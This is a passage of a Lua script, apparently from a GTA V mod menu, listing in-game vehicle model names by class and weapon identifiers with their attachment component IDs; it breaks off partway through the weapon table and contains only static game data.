    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b6 = {
    'WEAPON_KNIFE',
    'WEAPON_KNUCKLE',
    'WEAPON_NIGHTSTICK',
    'WEAPON_HAMMER',
    'WEAPON_BAT',
    'WEAPON_GOLFCLUB',
    'WEAPON_CROWBAR',
    'WEAPON_BOTTLE',
    'WEAPON_DAGGER',
    'WEAPON_HATCHET',
    'WEAPON_MACHETE',
    'WEAPON_FLASHLIGHT',
    'WEAPON_SWITCHBLADE',
    'WEAPON_PISTOL',
    'WEAPON_PISTOL_MK2',
    'WEAPON_COMBATPISTOL',
    'WEAPON_APPISTOL',
    'WEAPON_PISTOL50',
    'WEAPON_SNSPISTOL',
    'WEAPON_HEAVYPISTOL',
    'WEAPON_VINTAGEPISTOL',
    'WEAPON_STUNGUN',
    'WEAPON_FLAREGUN',
    'WEAPON_MARKSMANPISTOL',
    'WEAPON_REVOLVER',
    'WEAPON_MICROSMG',
    'WEAPON_SMG',
    'WEAPON_SMG_MK2',
    'WEAPON_ASSAULTSMG',
    'WEAPON_MG',
    'WEAPON_COMBATMG',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_COMBATPDW',
    'WEAPON_GUSENBERG',
    'WEAPON_MACHINEPISTOL',
    'WEAPON_ASSAULTRIFLE',
    'WEAPON_ASSAULTRIFLE_MK2',
    'WEAPON_CARBINERIFLE',
    'WEAPON_CARBINERIFLE_MK2',
    'WEAPON_ADVANCEDRIFLE',
    'WEAPON_SPECIALCARBINE',
    'WEAPON_BULLPUPRIFLE',
    'WEAPON_COMPACTRIFLE',
    'WEAPON_PUMPSHOTGUN',
    'WEAPON_SAWNOFFSHOTGUN',
    'WEAPON_BULLPUPSHOTGUN',
    'WEAPON_ASSAULTSHOTGUN',
    'WEAPON_MUSKET',
    'WEAPON_HEAVYSHOTGUN',
    'WEAPON_DBSHOTGUN',
    'WEAPON_SNIPERRIFLE',
    'WEAPON_HEAVYSNIPER',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_MARKSMANRIFLE',
    'WEAPON_GRENADELAUNCHER',
    'WEAPON_GRENADELAUNCHER_SMOKE',
    'WEAPON_RPG',
    'WEAPON_STINGER',
    'WEAPON_FIREWORK',
    'WEAPON_HOMINGLAUNCHER',
    'WEAPON_GRENADE',
    'WEAPON_STICKYBOMB',
    'WEAPON_PROXMINE',
    'WEAPON_BZGAS',
    'WEAPON_SMOKEGRENADE',
    'WEAPON_MOLOTOV',
    'WEAPON_FIREEXTINGUISHER',
    'WEAPON_PETROLCAN',
    'WEAPON_SNOWBALL',
    'WEAPON_FLARE',
    'WEAPON_BALL'
}
local b7 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~r~> ~s~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~r~> ~s~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~r~> ~s~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~r~> ~s~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~r~> ~s~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~r~> ~s~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~r~> ~s~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~r~> ~s~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~r~> ~s~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~r~> ~s~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~r~> ~s~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~r~> ~s~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~r~> ~s~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~r~> ~s~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~r~> ~s~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~r~> ~s~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~r~> ~s~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~r~> ~s~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~r~> ~s~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~r~> ~s~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {
                        'Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~r~> ~s~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~r~> ~s~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~r~> ~s~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~r~> ~s~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~r~> ~s~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~r~> ~s~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~r~> ~s~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~r~> ~s~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~r~> ~s~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~r~> ~s~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
